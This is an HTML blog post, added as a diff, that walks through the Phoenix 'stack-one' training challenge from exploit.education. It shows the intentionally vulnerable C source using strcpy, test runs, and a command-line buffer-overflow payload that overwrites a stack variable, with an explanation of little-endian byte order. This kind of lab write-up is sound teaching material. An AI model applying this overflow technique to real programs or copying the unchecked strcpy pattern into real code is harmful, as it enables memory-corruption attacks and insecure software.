@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || Phoenix: Stack One</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">Phoenix: Stack One</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="January 28, 2019">
+      Jan 28
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/exploit">exploit</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/phoenix">phoenix</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/x86">x86</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p>Goal: Modify the value of the changeme variable to 0x496c5962</p>
+<p>Source code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="cm">/*
+</span><span class="cm"> * phoenix/stack-one, by https://exploit.education
+</span><span class="cm"> *
+</span><span class="cm"> * The aim is to change the contents of the changeme variable to 0x496c5962
+</span><span class="cm"> *
+</span><span class="cm"> * Did you hear about the kid napping at the local school?
+</span><span class="cm"> * It&#39;s okay, they woke up.
+</span><span class="cm"> *
+</span><span class="cm"> */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;err.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define BANNER \
+</span><span class="cp">  &#34;Welcome to &#34; LEVELNAME &#34;, brought to you by https:</span><span class="c1">//exploit.education&#34;
+</span><span class="c1"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">struct</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">changeme</span><span class="p">;</span>
+  <span class="p">}</span> <span class="n">locals</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BANNER</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;specify an argument, to be copied into the </span><span class="se">\&#34;</span><span class="s">buffer</span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">locals</span><span class="p">.</span><span class="n">changeme</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span> <span class="o">==</span> <span class="mh">0x496c5962</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well done, you have successfully set changeme to the correct value&#34;</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Getting closer! changeme is currently 0x%08x, we want 0x496c5962</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+        <span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>This one exploits the same vulnerability than stack zero, but instead of the <code>gets</code> function, the <code>strcpy</code> function is used. Like <code>gets</code>, it doesn&rsquo;t check if the content will fit in the destination buffer&hellip;</p>
+<p>Some tests:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./stack-one
+Welcome to phoenix/stack-one, brought to you by https://exploit.education
+stack-one: specify an argument, to be copied into the <span class="s2">&#34;buffer&#34;</span>
+$ ./stack-one <span class="sb">`</span>python -c <span class="s2">&#34;print(&#39;A&#39;*64)&#34;</span><span class="sb">`</span>
+Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Getting closer! changeme is currently 0x00000000, we want 0x496c5962
+$ ./stack-one <span class="sb">`</span>python -c <span class="s2">&#34;print(&#39;A&#39;*64 + &#39;B&#39;*4)&#34;</span><span class="sb">`</span>
+Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Getting closer! changeme is currently 0x42424242, we want 0x496c5962
+</code></pre></div><p>If the input is longer than 64 bytes, like in the last run where we use 64 As
+and 4 Bs, <code>changeme</code> end up being equal to 0x42424242, which is the ascii code
+for <code>B</code>.</p>
+<p>Just need to replace BBBB with 0x496c5962 to solve that challenge right?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./stack-one <span class="sb">`</span>python -c <span class="s2">&#34;print(&#39;A&#39;*64 + &#39;\x49\x6c\x59\x62&#39;)&#34;</span><span class="sb">`</span>
+Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
+</code></pre></div><p>Nearly! It&rsquo;s all backwards! That&rsquo;s because x86 uses the little-endian representation. Basically, if we want to store an int32_t 0xAABBCCDD, it will be stored like this in big endian:</p>
+<table>
+<thead>
+<tr>
+<th>+0</th>
+<th>+1</th>
+<th>+2</th>
+<th>+3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AA</td>
+<td>BB</td>
+<td>CC</td>
+<td>DD</td>
+</tr>
+</tbody>
+</table>
+<p>But in little endian, the least significant byte goes into the lowest address</p>
+<table>
+<thead>
+<tr>
+<th>+0</th>
+<th>+1</th>
+<th>+2</th>
+<th>+3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DD</td>
+<td>CC</td>
+<td>BB</td>
+<td>AA</td>
+</tr>
+</tbody>
+</table>
+<p>Therefore, we need to invert the order of the bytes:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./stack-one `python -c &#34;print(&#39;A&#39;*64 + &#39;\x62\x59\x6c\x49&#39;)&#34;`
+Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Well done, you have successfully set changeme to the correct value
+</code></pre></div>
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents"></nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
